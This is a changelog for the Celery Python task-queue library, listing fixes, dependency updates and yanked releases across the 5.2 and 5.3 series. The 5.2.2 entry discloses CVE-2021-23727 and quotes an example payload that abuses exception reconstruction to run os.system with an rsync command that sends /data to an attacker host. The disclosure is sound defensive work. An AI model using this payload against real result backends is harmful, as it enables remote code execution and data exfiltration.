-   Update GHA checkout version (\#8496)
-   Fixed replaced\_task\_nesting (\#8500)
-   Fix code indentation for route\_task() example (\#8502)
-   support redis 5.x (\#8504)
-   Fix typos in test\_canvas.py (\#8498)
-   Marked flaky tests (\#8508)
-   Fix typos in calling.rst (\#8506)
-   Added support for replaced\_task\_nesting in chains (\#8501)
-   Fix typos in canvas.rst (\#8509)
-   Patch Version Release Checklist (\#8488)
-   Added Python 3.11 support to Dockerfile (\#8511)
-   Dependabot (Celery) (\#8510)
-   Bump actions/checkout from 3 to 4 (\#8512)
-   Update ETA example to include timezone (\#8516)
-   Replaces datetime.fromisoformat with the more lenient dateutil parser (\#8507)
-   Fixed indentation in Dockerfile for Python 3.11 (\#8527)
-   Fix git bug in Dockerfile (\#8528)
-   Tox lint upgrade from Python 3.9 to Python 3.11 (\#8526)
-   Document gevent concurrency (\#8520)
-   Update test.txt (\#8530)
-   Celery Docker Upgrades (\#8531)
-   pyupgrade upgrade v3.11.0 -\> v3.13.0 (\#8535)
-   Update msgpack.txt (\#8548)
-   Update auth.txt (\#8547)
-   Update msgpack.txt to fix build issues (\#8552)
-   Basic ElasticSearch / ElasticClient 8.x Support (\#8519)
-   Fix eager tasks does not populate name field (\#8486)
-   Fix typo in celery.app.control (\#8563)
-   Update solar.txt ephem (\#8566)
-   Update test.txt pytest-timeout (\#8565)
-   Correct some mypy errors (\#8570)
-   Update elasticsearch.txt (\#8573)
-   Update test.txt deps (\#8574)
-   Update test.txt (\#8590)
-   Improved the \"Next steps\" documentation (\#8561). (\#8600)
-   Disabled couchbase tests due to broken package breaking main (\#8602)
-   Update elasticsearch deps (\#8605)
-   Update cryptography==41.0.5 (\#8604)
-   Update pytest==7.4.3 (\#8606)
-   test initial support of python 3.12.x (\#8549)
-   updated new versions to fix CI (\#8607)
-   Update zstd.txt (\#8609)
-   Fixed CI Support with Python 3.12 (\#8611)
-   updated CI, docs and classifier for next release (\#8613)
-   updated dockerfile to add python 3.12 (\#8614)
-   lint,mypy,docker-unit-tests -\> Python 3.12 (\#8617)
-   Correct type of [request]{.title-ref} in [task\_revoked]{.title-ref} documentation (\#8616)
-   update docs docker image (\#8618)
-   Fixed RecursionError caused by giving [config\_from\_object]{.title-ref} nested mod... (\#8619)
-   Fix: serialization error when gossip working (\#6566)
-   \[documentation\] broker\_connection\_max\_retries of 0 does not mean \"retry forever\" (\#8626)
-   added 2 debian package for better stability in Docker (\#8629)

5.3.4 {#version-5.3.4}
-----

release-date

:   2023-09-03 10:10 P.M GMT+2

release-by

:   Tomer Nosrati

::: {.warning}
::: {.title}
Warning
:::

This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:

-   Revert \"store children with database backend\" (\#8475)
-   Revert \"Fix eager tasks does not populate name field\" (\#8476)
:::

-   Bugfix: Removed unecessary stamping code from \_chord.run() (\#8339)
-   User guide fix (hotfix for \#1755) (\#8342)
-   store children with database backend (\#8338)
-   Stamping bugfix with group/chord header errback linking (\#8347)
-   Use argsrepr and kwargsrepr in LOG\_RECEIVED (\#8301)
-   Fixing minor typo in code example in calling.rst (\#8366)
-   add documents for timeout settings (\#8373)
-   fix: copyright year (\#8380)
-   setup.py: enable include\_package\_data (\#8379)
-   Fix eager tasks does not populate name field (\#8383)
-   Update test.txt dependencies (\#8389)
-   Update auth.txt deps (\#8392)
-   Fix backend.get\_task\_meta ignores the result\_extended config parameter in mongodb backend (\#8391)
-   Support preload options for shell and purge commands (\#8374)
-   Implement safer ArangoDB queries (\#8351)
-   integration test: cleanup worker after test case (\#8361)
-   Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (\#8400)
-   Update README.rst (\#8404)
-   Update README.rst (\#8408)
-   fix(canvas): add group index when unrolling tasks (\#8427)
-   fix(beat): debug statement should only log AsyncResult.id if it exists (\#8428)
-   Lint fixes & pre-commit autoupdate (\#8414)
-   Update auth.txt (\#8435)
-   Update mypy on test.txt (\#8438)
-   added missing kwargs arguments in some cli cmd (\#8049)
-   Fix \#8431: Set format\_date to False when calling \_get\_result\_meta on mongo backend (\#8432)
-   Docs: rewrite out-of-date code (\#8441)
-   Limit redis client to 4.x since 5.x fails the test suite (\#8442)
-   Limit tox to \< 4.9 (\#8443)
-   Fixed issue: Flags broker\_connection\_retry\_on\_startup & broker\_connection\_retry aren't reliable (\#8446)
-   doc update from \#7651 (\#8451)
-   Remove tox version limit (\#8464)
-   Fixed AttributeError: \'str\' object has no attribute (\#8463)
-   Upgraded Kombu from 5.3.1 -\> 5.3.2 (\#8468)
-   Document need for [CELERY]() prefix on CLI env vars (\#8469)
-   Use string value for CELERY\_SKIP\_CHECKS envvar (\#8462)
-   Revert \"store children with database backend\" (\#8475)
-   Revert \"Fix eager tasks does not populate name field\" (\#8476)
-   Update Changelog (\#8474)
-   Remove as it seems to be buggy. (\#8340)
-   Revert \"Add Semgrep to CI\" (\#8477)
-   Revert \"Revert \"Add Semgrep to CI\"\" (\#8478)

5.3.3 (Yanked) {#version-5.3.3}
--------------

release-date

:   2023-08-31 1:47 P.M GMT+2

release-by

:   Tomer Nosrati

::: {.warning}
::: {.title}
Warning
:::

This version has been yanked due to breaking API changes. The breaking changes include:

-   Store children with database backend (\#8338)
-   Fix eager tasks does not populate name field (\#8383)
:::

-   Fixed changelog for 5.3.2 release docs.

5.3.2 (Yanked) {#version-5.3.2}
--------------

release-date

:   2023-08-31 1:30 P.M GMT+2

release-by

:   Tomer Nosrati

::: {.warning}
::: {.title}
Warning
:::

This version has been yanked due to breaking API changes. The breaking changes include:

-   Store children with database backend (\#8338)
-   Fix eager tasks does not populate name field (\#8383)
:::

-   Bugfix: Removed unecessary stamping code from \_chord.run() (\#8339)
-   User guide fix (hotfix for \#1755) (\#8342)
-   Store children with database backend (\#8338)
-   Stamping bugfix with group/chord header errback linking (\#8347)
-   Use argsrepr and kwargsrepr in LOG\_RECEIVED (\#8301)
-   Fixing minor typo in code example in calling.rst (\#8366)
-   Add documents for timeout settings (\#8373)
-   Fix: copyright year (\#8380)
-   Setup.py: enable include\_package\_data (\#8379)
-   Fix eager tasks does not populate name field (\#8383)
-   Update test.txt dependencies (\#8389)
-   Update auth.txt deps (\#8392)
-   Fix backend.get\_task\_meta ignores the result\_extended config parameter in mongodb backend (\#8391)
-   Support preload options for shell and purge commands (\#8374)
-   Implement safer ArangoDB queries (\#8351)
-   Integration test: cleanup worker after test case (\#8361)
-   Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (\#8400)
-   Update README.rst (\#8404)
-   Update README.rst (\#8408)
-   Fix(canvas): add group index when unrolling tasks (\#8427)
-   Fix(beat): debug statement should only log AsyncResult.id if it exists (\#8428)
-   Lint fixes & pre-commit autoupdate (\#8414)
-   Update auth.txt (\#8435)
-   Update mypy on test.txt (\#8438)
-   Added missing kwargs arguments in some cli cmd (\#8049)
-   Fix \#8431: Set format\_date to False when calling \_get\_result\_meta on mongo backend (\#8432)
-   Docs: rewrite out-of-date code (\#8441)
-   Limit redis client to 4.x since 5.x fails the test suite (\#8442)
-   Limit tox to \< 4.9 (\#8443)
-   Fixed issue: Flags broker\_connection\_retry\_on\_startup & broker\_connection\_retry aren't reliable (\#8446)
-   Doc update from \#7651 (\#8451)
-   Remove tox version limit (\#8464)
-   Fixed AttributeError: \'str\' object has no attribute (\#8463)
-   Upgraded Kombu from 5.3.1 -\> 5.3.2 (\#8468)

5.3.1 {#version-5.3.1}
-----

release-date

:   2023-06-18 8:15 P.M GMT+6

release-by

:   Asif Saif Uddin

-   Upgrade to latest pycurl release (\#7069).
-   Limit librabbitmq\>=2.0.0; python\_version \< \'3.11\' (\#8302).
-   Added initial support for python 3.11 (\#8304).
-   ChainMap observers fix (\#8305).
-   Revert optimization CLI flag behaviour back to original.
-   Restrict redis 4.5.5 as it has severe bugs (\#8317).
-   Tested pypy 3.10 version in CI (\#8320).
-   Bump new version of kombu to 5.3.1 (\#8323).
-   Fixed a small float value of retry\_backoff (\#8295).
-   Limit pyro4 up to python 3.10 only as it is (\#8324).

5.3.0 {#version-5.3.0}
-----

release-date

:   2023-06-06 12:00 P.M GMT+6

release-by

:   Asif Saif Uddin

-   Test kombu 5.3.0 & minor doc update (\#8294).
-   Update librabbitmq.txt \> 2.0.0 (\#8292).
-   Upgrade syntax to py3.8 (\#8281).

5.3.0rc2 {#version-5.3.0rc2}
--------

release-date

:   2023-05-31 9:00 P.M GMT+6

release-by

:   Asif Saif Uddin

-   Add missing dependency.
-   Fix exc\_type being the exception instance rather.
-   Fixed revoking tasks by stamped headers (\#8269).
-   Support sqlalchemy 2.0 in tests (\#8271).
-   Fix docker (\#8275).
-   Update redis.txt to 4.5 (\#8278).
-   Update kombu\>=5.3.0rc2.

5.3.0rc1 {#version-5.3.0rc1}
--------

release-date

:   2023-05-11 4:24 P.M GMT+2

release-by

:   Tomer Nosrati

-   fix functiom name by \@cuishuang in \#8087
-   Update CELERY\_TASK\_EAGER setting in user guide by \@thebalaa in \#8085
-   Stamping documentation fixes & cleanups by \@Nusnus in \#8092
-   switch to maintained pyro5 by \@auvipy in \#8093
-   udate dependencies of tests by \@auvipy in \#8095
-   cryptography==39.0.1 by \@auvipy in \#8096
-   Annotate celery/security/certificate.py by \@Kludex in \#7398
-   Deprecate parse\_iso8601 in favor of fromisoformat by \@stumpylog in \#8098
-   pytest==7.2.2 by \@auvipy in \#8106
-   Type annotations for celery/utils/text.py by \@max-muoto in \#8107
-   Update web framework URLs by \@sblondon in \#8112
-   Fix contribution URL by \@sblondon in \#8111
-   Trying to clarify CERT\_REQUIRED by \@pamelafox in \#8113
-   Fix potential AttributeError on \'stamps\' by \@Darkheir in \#8115
-   Type annotations for celery/apps/beat.py by \@max-muoto in \#8108
-   Fixed bug where retrying a task loses its stamps by \@Nusnus in \#8120
-   Type hints for celery/schedules.py by \@max-muoto in \#8114
-   Reference Gopher Celery in README by \@marselester in \#8131
-   Update sqlalchemy.txt by \@auvipy in \#8136
-   azure-storage-blob 12.15.0 by \@auvipy in \#8137
-   test kombu 5.3.0b3 by \@auvipy in \#8138
-   fix: add expire string parse. by \@Bidaya0 in \#8134
-   Fix worker crash on un-pickleable exceptions by \@youtux in \#8133
-   CLI help output: avoid text rewrapping by click by \@woutdenolf in \#8152
-   Warn when an unnamed periodic task override another one. by \@iurisilvio in \#8143
-   Fix Task.handle\_ignore not wrapping exceptions properly by \@youtux in \#8149
-   Hotfix for (\#8120) - Stamping bug with retry by \@Nusnus in \#8158
-   Fix integration test by \@youtux in \#8156
-   Fixed bug in revoke\_by\_stamped\_headers where impl did not match doc by \@Nusnus in \#8162
-   Align revoke and revoke\_by\_stamped\_headers return values (terminate=True) by \@Nusnus in \#8163
-   Update & simplify GHA pip caching by \@stumpylog in \#8164
-   Update auth.txt by \@auvipy in \#8167
-   Update test.txt versions by \@auvipy in \#8173
-   remove extra = from test.txt by \@auvipy in \#8179
-   Update sqs.txt kombu\[sqs\]\>=5.3.0b3 by \@auvipy in \#8174
-   Added signal triggered before fork by \@jaroslawporada in \#8177
-   Update documentation on SQLAlchemy by \@max-muoto in \#8188
-   Deprecate pytz and use zoneinfo by \@max-muoto in \#8159
-   Update dev.txt by \@auvipy in \#8192
-   Update test.txt by \@auvipy in \#8193
-   Update test-integration.txt by \@auvipy in \#8194
-   Update zstd.txt by \@auvipy in \#8195
-   Update s3.txt by \@auvipy in \#8196
-   Update msgpack.txt by \@auvipy in \#8199
-   Update solar.txt by \@auvipy in \#8198
-   Add Semgrep to CI by \@Nusnus in \#8201
-   Added semgrep to README.rst by \@Nusnus in \#8202
-   Update django.txt by \@auvipy in \#8197
-   Update redis.txt 4.3.6 by \@auvipy in \#8161
-   start removing codecov from pypi by \@auvipy in \#8206
-   Update test.txt dependencies by \@auvipy in \#8205
-   Improved doc for: worker\_deduplicate\_successful\_tasks by \@Nusnus in \#8209
-   Renamed revoked\_headers to revoked\_stamps by \@Nusnus in \#8210
-   Ensure argument for map is JSON serializable by \@candleindark in \#8229

5.3.0b2 {#version-5.3.0b2}
-------

release-date

:   2023-02-19 1:47 P.M GMT+2

release-by

:   Asif Saif Uddin

-   BLM-2: Adding unit tests to chord clone by \@Nusnus in \#7668
-   Fix unknown task error typo by \@dcecile in \#7675
-   rename redis integration test class so that tests are executed by \@wochinge in \#7684
-   Check certificate/private key type when loading them by \@qrmt in \#7680
-   Added integration test\_chord\_header\_id\_duplicated\_on\_rabbitmq\_msg\_duplication() by \@Nusnus in \#7692
-   New feature flag: allow\_error\_cb\_on\_chord\_header - allowing setting an error callback on chord header by \@Nusnus in \#7712
-   Update README.rst sorting Python/Celery versions by \@andrebr in \#7714
-   Fixed a bug where stamping a chord body would not use the correct stamping method by \@Nusnus in \#7722
-   Fixed doc duplication typo for Signature.stamp() by \@Nusnus in \#7725
-   Fix issue 7726: variable used in finally block may not be instantiated by \@woutdenolf in \#7727
-   Fixed bug in chord stamping with another chord as a body + unit test by \@Nusnus in \#7730
-   Use \"describe\_table\" not \"create\_table\" to check for existence of DynamoDB table by \@maxfirman in \#7734
-   Enhancements for task\_allow\_error\_cb\_on\_chord\_header tests and docs by \@Nusnus in \#7744
-   Improved custom stamping visitor documentation by \@Nusnus in \#7745
-   Improved the coverage of test\_chord\_stamping\_body\_chord() by \@Nusnus in \#7748
-   billiard \>= 3.6.3.0,\<5.0 for rpm by \@auvipy in \#7764
-   Fixed memory leak with ETA tasks at connection error when worker\_cancel\_long\_running\_tasks\_on\_connection\_loss is enabled by \@Nusnus in \#7771
-   Fixed bug where a chord with header of type tuple was not supported in the link\_error flow for task\_allow\_error\_cb\_on\_chord\_header flag by \@Nusnus in \#7772
-   Scheduled weekly dependency update for week 38 by \@pyup-bot in \#7767
-   recreate\_module: set spec to the new module by \@skshetry in \#7773
-   Override integration test config using integration-tests-config.json by \@thedrow in \#7778
-   Fixed error handling bugs due to upgrade to a newer version of billiard by \@Nusnus in \#7781
-   Do not recommend using easy\_install anymore by \@jugmac00 in \#7789
-   GitHub Workflows security hardening by \@sashashura in \#7768
-   Update ambiguous acks\_late doc by \@Zhong-z in \#7728
-   billiard \>=4.0.2,\<5.0 by \@auvipy in \#7720
-   importlib\_metadata remove deprecated entry point interfaces by \@woutdenolf in \#7785
-   Scheduled weekly dependency update for week 41 by \@pyup-bot in \#7798
-   pyzmq\>=22.3.0 by \@auvipy in \#7497
-   Remove amqp from the BACKEND\_ALISES list by \@Kludex in \#7805
-   Replace print by logger.debug by \@Kludex in \#7809
-   Ignore coverage on except ImportError by \@Kludex in \#7812
-   Add mongodb dependencies to test.txt by \@Kludex in \#7810
-   Fix grammar typos on the whole project by \@Kludex in \#7815
-   Remove isatty wrapper function by \@Kludex in \#7814
-   Remove unused variable \_range by \@Kludex in \#7813
-   Add type annotation on concurrency/threads.py by \@Kludex in \#7808
-   Fix linter workflow by \@Kludex in \#7816
-   Scheduled weekly dependency update for week 42 by \@pyup-bot in \#7821
-   Remove .cookiecutterrc by \@Kludex in \#7830
-   Remove .coveragerc file by \@Kludex in \#7826
-   kombu\>=5.3.0b2 by \@auvipy in \#7834
-   Fix readthedocs build failure by \@woutdenolf in \#7835
-   Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by \@Nusnus in \#7825
-   Stabilized test\_mutable\_errback\_called\_by\_chord\_from\_group\_fail\_multiple by \@Nusnus in \#7837
-   Use SPDX license expression in project metadata by \@RazerM in \#7845
-   New control command revoke\_by\_stamped\_headers by \@Nusnus in \#7838
-   Clarify wording in Redis priority docs by \@strugee in \#7853
-   Fix non working example of using celery\_worker pytest fixture by \@paradox-lab in \#7857
-   Removed the mandatory requirement to include stamped\_headers key when implementing on\_signature() by \@Nusnus in \#7856
-   Update serializer docs by \@sondrelg in \#7858
-   Remove reference to old Python version by \@Kludex in \#7829
-   Added on\_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by \@Nusnus in \#7860
-   Add clarifying information to completed\_count documentation by \@hankehly in \#7873
-   Stabilized test\_revoked\_by\_headers\_complex\_canvas by \@Nusnus in \#7877
-   StampingVisitor will visit the callbacks and errbacks of the signature by \@Nusnus in \#7867
-   Fix \"rm: no operand\" error in clean-pyc script by \@hankehly in \#7878
-   Add \--skip-checks flag to bypass django core checks by \@mudetz in \#7859
-   Scheduled weekly dependency update for week 44 by \@pyup-bot in \#7868
-   Added two new unit tests to callback stamping by \@Nusnus in \#7882
-   Sphinx extension: use inspect.signature to make it Python 3.11 compatible by \@mathiasertl in \#7879
-   cryptography==38.0.3 by \@auvipy in \#7886
-   Canvas.py doc enhancement by \@Nusnus in \#7889
-   Fix typo by \@sondrelg in \#7890
-   fix typos in optional tests by \@hsk17 in \#7876
-   Canvas.py doc enhancement by \@Nusnus in \#7891
-   Fix revoke by headers tests stability by \@Nusnus in \#7892
-   feat: add global keyprefix for backend result keys by \@kaustavb12 in \#7620
-   Canvas.py doc enhancement by \@Nusnus in \#7897
-   fix(sec): upgrade sqlalchemy to 1.2.18 by \@chncaption in \#7899
-   Canvas.py doc enhancement by \@Nusnus in \#7902
-   Fix test warnings by \@ShaheedHaque in \#7906
-   Support for out-of-tree worker pool implementations by \@ShaheedHaque in \#7880
-   Canvas.py doc enhancement by \@Nusnus in \#7907
-   Use bound task in base task example. Closes \#7909 by \@WilliamDEdwards in \#7910
-   Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by \@Nusnus in \#7914
-   Stamping a task left the task properties dirty by \@Nusnus in \#7916
-   Fixed bug when chaining a chord with a group by \@Nusnus in \#7919
-   Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the \'stamps\' property by \@Nusnus in \#7928
-   Fixed bug in task\_accepted() where the request was not added to the requests but only to the active\_requests by \@Nusnus in \#7929
-   Fix bug in TraceInfo.\_log\_error() where the real exception obj was hiding behind \'ExceptionWithTraceback\' by \@Nusnus in \#7930
-   Added integration test: test\_all\_tasks\_of\_canvas\_are\_stamped() by \@Nusnus in \#7931
-   Added new example for the stamping mechanism: examples/stamping by \@Nusnus in \#7933
-   Fixed a bug where replacing a stamped task and stamping it again by \@Nusnus in \#7934
-   Bugfix for nested group stamping on task replace by \@Nusnus in \#7935
-   Added integration test test\_stamping\_example\_canvas() by \@Nusnus in \#7937
-   Fixed a bug in losing chain links when unchaining an inner chain with links by \@Nusnus in \#7938
-   Removing as not mandatory by \@auvipy in \#7885
-   Housekeeping for Canvas.py by \@Nusnus in \#7942
-   Scheduled weekly dependency update for week 50 by \@pyup-bot in \#7954
-   try pypy 3.9 in CI by \@auvipy in \#7956
-   sqlalchemy==1.4.45 by \@auvipy in \#7943
-   billiard\>=4.1.0,\<5.0 by \@auvipy in \#7957
-   feat(typecheck): allow changing type check behavior on the app level; by \@moaddib666 in \#7952
-   Add broker\_channel\_error\_retry option by \@nkns165 in \#7951
-   Add beat\_cron\_starting\_deadline\_seconds to prevent unwanted cron runs by \@abs25 in \#7945
-   Scheduled weekly dependency update for week 51 by \@pyup-bot in \#7965
-   Added doc to \"retry\_errors\" newly supported field of \"publish\_retry\_policy\" of the task namespace by \@Nusnus in \#7967
-   Renamed from master to main in the docs and the CI workflows by \@Nusnus in \#7968
-   Fix docs for the exchange to use with worker\_direct by \@alessio-b2c2 in \#7973
-   Pin redis==4.3.4 by \@auvipy in \#7974
-   return list of nodes to make sphinx extension compatible with Sphinx 6.0 by \@mathiasertl in \#7978
-   use version range redis\>=4.2.2,\<4.4.0 by \@auvipy in \#7980
-   Scheduled weekly dependency update for week 01 by \@pyup-bot in \#7987
-   Add annotations to minimise differences with celery-aio-pool\'s tracer.py. by \@ShaheedHaque in \#7925
-   Fixed bug where linking a stamped task did not add the stamp to the link\'s options by \@Nusnus in \#7992
-   sqlalchemy==1.4.46 by \@auvipy in \#7995
-   pytz by \@auvipy in \#8002
-   Fix few typos, provide configuration + workflow for codespell to catch any new by \@yarikoptic in \#8023
-   RabbitMQ links update by \@arnisjuraga in \#8031
-   Ignore files generated by tests by \@Kludex in \#7846
-   Revert \"sqlalchemy==1.4.46 (\#7995)\" by \@Nusnus in \#8033
-   Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by \@Nusnus in \#8034
-   Fixed formatting in setup.cfg that caused flake8 to misbehave by \@Nusnus in \#8044
-   Removed duplicated import Iterable by \@Nusnus in \#8046
-   Fix docs by \@Nusnus in \#8047
-   Document \--logfile default by \@strugee in \#8057
-   Stamping Mechanism Refactoring by \@Nusnus in \#8045
-   result\_backend\_thread\_safe config shares backend across threads by \@CharlieTruong in \#8058
-   Fix cronjob that use day of month and negative UTC timezone by \@pkyosx in \#8053
-   Stamping Mechanism Examples Refactoring by \@Nusnus in \#8060
-   Fixed bug in Task.on\_stamp\_replaced() by \@Nusnus in \#8061
-   Stamping Mechanism Refactoring 2 by \@Nusnus in \#8064
-   Changed default append\_stamps from True to False (meaning duplicates ... by \@Nusnus in \#8068
-   typo in comment: mailicious =\> malicious by \@yanick in \#8072
-   Fix command for starting flower with specified broker URL by \@ShukantPal in \#8071
-   Improve documentation on ETA/countdown tasks (\#8069) by \@norbertcyran in \#8075

5.3.0b1 {#version-5.3.0b1}
-------

release-date

:   2022-08-01 5:15 P.M UTC+6:00

release-by

:   Asif Saif Uddin

-   Canvas Header Stamping (\#7384).
-   async chords should pass it\'s kwargs to the group/body.
-   beat: Suppress banner output with the quiet option (\#7608).
-   Fix honor Django\'s TIME\_ZONE setting.
-   Don\'t warn about DEBUG=True for Django.
-   Fixed the on\_after\_finalize cannot access tasks due to deadlock.
-   Bump kombu\>=5.3.0b1,\<6.0.
-   Make default worker state limits configurable (\#7609).
-   Only clear the cache if there are no active writers.
-   Billiard 4.0.1

5.3.0a1 {#version-5.3.0a1}
-------

release-date

:   2022-06-29 5:15 P.M UTC+6:00

release-by

:   Asif Saif Uddin

-   Remove Python 3.4 compatibility code.
-   call ping to set connection attr for avoiding redis parse\_response error.
-   Use importlib instead of deprecated pkg\_resources.
-   fix \#7245 uid duplicated in command params.
-   Fix subscribed\_to maybe empty (\#7232).
-   Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) \#7290.
-   Add security\_key\_password option (\#7292).
-   Limit elasticsearch support to below version 8.0.
-   try new major release of pytest 7 (\#7330).
-   broker\_connection\_retry should no longer apply on startup (\#7300).
-   Remove \_\_ne\_\_ methods (\#7257).
-   fix \#7200 uid and gid.
-   Remove exception-throwing from the signal handler.
-   Add mypy to the pipeline (\#7383).
-   Expose more debugging information when receiving unknown tasks. (\#7405)
-   Avoid importing buf\_t from billiard\'s compat module as it was removed.
-   Avoid negating a constant in a loop. (\#7443)
-   Ensure expiration is of float type when migrating tasks (\#7385).
-   load\_extension\_class\_names - correct module\_name (\#7406)
-   Bump pymongo\[srv\]\>=4.0.2.
-   Use inspect.getgeneratorstate in asynpool.gen\_not\_started (\#7476).
-   Fix test with missing .get() (\#7479).
-   azure-storage-blob\>=12.11.0
-   Make start\_worker, setup\_default\_app reusable outside of pytest.
-   Ensure a proper error message is raised when id for key is empty (\#7447).
-   Crontab string representation does not match UNIX crontab expression.
-   Worker should exit with ctx.exit to get the right exitcode for non-zero.
-   Fix expiration check (\#7552).
-   Use callable built-in.
-   Include dont\_autoretry\_for option in tasks. (\#7556)
-   fix: Syntax error in arango query.
-   Fix custom headers propagation on task retries (\#7555).
-   Silence backend warning when eager results are stored.
-   Reduce prefetch count on restart and gradually restore it (\#7350).
-   Improve workflow primitive subclassing (\#7593).
-   test kombu\>=5.3.0a1,\<6.0 (\#7598).
-   Canvas Header Stamping (\#7384).

5.2.7 {#version-5.2.7}
-----

release-date

:   2022-5-26 12:15 P.M UTC+2:00

release-by

:   Omer Katz

-   Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (\#7534).

5.2.6 {#version-5.2.6}
-----

release-date

:   2022-4-04 21:15 P.M UTC+2:00

release-by

:   Omer Katz

-   

    load\_extension\_class\_names - correct module\_name (\#7433).

    :   This fixes a regression caused by \#7218.

5.2.5 {#version-5.2.5}
-----

release-date

:   2022-4-03 20:42 P.M UTC+2:00

release-by

:   Omer Katz

**This release was yanked due to a regression caused by the PR below**

-   Use importlib instead of deprecated pkg\_resources (\#7218).

5.2.4 {#version-5.2.4}
-----

release-date

:   2022-4-03 20:30 P.M UTC+2:00

release-by

:   Omer Katz

-   Expose more debugging information when receiving unknown tasks (\#7404).

5.2.3 {#version-5.2.3}
-----

release-date

:   2021-12-29 12:00 P.M UTC+6:00

release-by

:   Asif Saif Uddin

-   Allow redis \>= 4.0.2.
-   Upgrade minimum required pymongo version to 3.11.1.
-   tested pypy3.8 beta (\#6998).
-   Split Signature.\_\_or\_\_ into subclasses\' \_\_or\_\_ (\#7135).
-   Prevent duplication in event loop on Consumer restart.
-   Restrict setuptools\>=59.1.1,\<59.7.0.
-   Kombu bumped to v5.2.3
-   py-amqp bumped to v5.0.9
-   Some docs & CI improvements.

5.2.2 {#version-5.2.2}
-----

release-date

:   2021-12-26 16:30 P.M UTC+2:00

release-by

:   Omer Katz

-   Various documentation fixes.

-   Fix CVE-2021-23727 (Stored Command Injection security vulnerability).

    > When a task fails, the failure information is serialized in the backend. In some cases, the exception class is only importable from the consumer\'s code base. In this case, we reconstruct the exception class so that we can re-raise the error on the process which queried the task\'s result. This was introduced in \#4836. If the recreated exception type isn\'t an exception, this is a security issue. Without the condition included in this patch, an attacker could inject a remote code execution instruction such as: `os.system("rsync /data attacker@192.168.56.100:~/data")` by setting the task\'s result to a failure in the result backend with the os, the system function as the exception type and the payload `rsync /data attacker@192.168.56.100:~/data` as the exception arguments like so:
    >
    > ``` {.python}
    > {
    >       "exc_module": "os",
    >       'exc_type': "system",
    >       "exc_message": "rsync /data attacker@192.168.56.100:~/data"
    > }
    > ```
    >
    > According to my analysis, this vulnerability can only be exploited if the producer delayed a task which runs long enough for the attacker to change the result mid-flight, and the producer has polled for the task\'s result. The attacker would also have to gain access to the result backend. The severity of this security vulnerability is low, but we still recommend upgrading.

5.2.1 {#version-5.2.1}
-----

release-date

:   2021-11-16 8.55 P.M UTC+6:00

release-by

:   Asif Saif Uddin

-   Fix rstrip usage on bytes instance in ProxyLogger.
-   Pass logfile to ExecStop in celery.service example systemd file.
-   fix: reduce latency of AsyncResult.get under gevent (\#7052)
-   Limit redis version: \<4.0.0.
-   Bump min kombu version to 5.2.2.
-   Change pytz\>dev to a PEP 440 compliant pytz\>0.dev.0.
-   Remove dependency to case (\#7077).
-   fix: task expiration is timezone aware if needed (\#7065).
-   Initial testing of pypy-3.8 beta to CI.
-   Docs, CI & tests cleanups.

5.2.0 {#version-5.2.0}
-----

release-date

:   2021-11-08 7.15 A.M UTC+6:00

release-by

:   Asif Saif Uddin

-   Prevent from subscribing to empty channels (\#7040)
-   fix register\_task method.
-   Fire task failure signal on final reject (\#6980)
-   Limit pymongo version: \<3.12.1 (\#7041)
-   Bump min kombu version to 5.2.1

5.2.0rc2 {#version-5.2.0rc2}
--------

release-date

:   2021-11-02 1.54 P.M UTC+3:00

release-by

:   Naomi Elstein

-   Bump Python 3.10.0 to rc2.
-   \[pre-commit.ci\] pre-commit autoupdate (\#6972).
-   autopep8.
-   Prevent worker to send expired revoked items upon hello command (\#6975).
-   docs: clarify the \'keeping results\' section (\#6979).
-   Update deprecated task module removal in 5.0 documentation (\#6981).
-   \[pre-commit.ci\] pre-commit autoupdate.
-   try python 3.10 GA.
-   mention python 3.10 on readme.
-   Documenting the default consumer\_timeout value for rabbitmq \>= 3.8.15.
-   Azure blockblob backend parametrized connection/read timeouts (\#6978).
-   Add as\_uri method to azure block blob backend.
-   Add possibility to override backend implementation with celeryconfig (\#6879).
-   \[pre-commit.ci\] pre-commit autoupdate.
-   try to fix deprecation warning.
-   \[pre-commit.ci\] pre-commit autoupdate.
-   not needed anyore.
-   not needed anyore.
-   not used anymore.
-   add github discussions forum

5.2.0rc1 {#version-5.2.0rc1}
--------

release-date

:   2021-09-26 4.04 P.M UTC+3:00

release-by

:   Omer Katz

-   Kill all workers when main process exits in prefork model (\#6942).
-   test kombu 5.2.0rc1 (\#6947).
-   try moto 2.2.x (\#6948).
-   Prepared Hacker News Post on Release Action.
-   update setup with python 3.7 as minimum.
-   update kombu on setupcfg.
-   Added note about automatic killing all child processes of worker after its termination.
-   \[pre-commit.ci\] pre-commit autoupdate.
-   Move importskip before greenlet import (\#6956).
-   amqp: send expiration field to broker if requested by user (\#6957).
-   Single line drift warning.
-   canvas: fix kwargs argument to prevent recursion (\#6810) (\#6959).
-   Allow to enable Events with app.conf mechanism.
-   Warn when expiration date is in the past.
-   Add the Framework :: Celery trove classifier.
-   Give indication whether the task is replacing another (\#6916).
-   Make setup.py executable.
-   Bump version: 5.2.0b3 → 5.2.0rc1.

5.2.0b3 {#version-5.2.0b3}
-------

release-date

:   2021-09-02 8.38 P.M UTC+3:00

release-by

:   Omer Katz

-   Add args to LOG\_RECEIVED (fixes \#6885) (\#6898).
-   Terminate job implementation for eventlet concurrency backend (\#6917).
-   Add cleanup implementation to filesystem backend (\#6919).
-   \[pre-commit.ci\] pre-commit autoupdate (\#69).
-   Add before\_start hook (fixes \#4110) (\#6923).
-   Restart consumer if connection drops (\#6930).
-   Remove outdated optimization documentation (\#6933).
-   added https verification check functionality in arangodb backend (\#6800).
-   Drop Python 3.6 support.
-   update supported python versions on readme.
-   \[pre-commit.ci\] pre-commit autoupdate (\#6935).
-   Remove appveyor configuration since we migrated to GA.
-   pyugrade is now set to upgrade code to 3.7.
-   Drop exclude statement since we no longer test with pypy-3.6.
-   3.10 is not GA so it\'s not supported yet.
-   Celery 5.1 or earlier support Python 3.6.
-   Fix linting error.
-   fix: Pass a Context when chaining fail results (\#6899).
-   Bump version: 5.2.0b2 → 5.2.0b3.

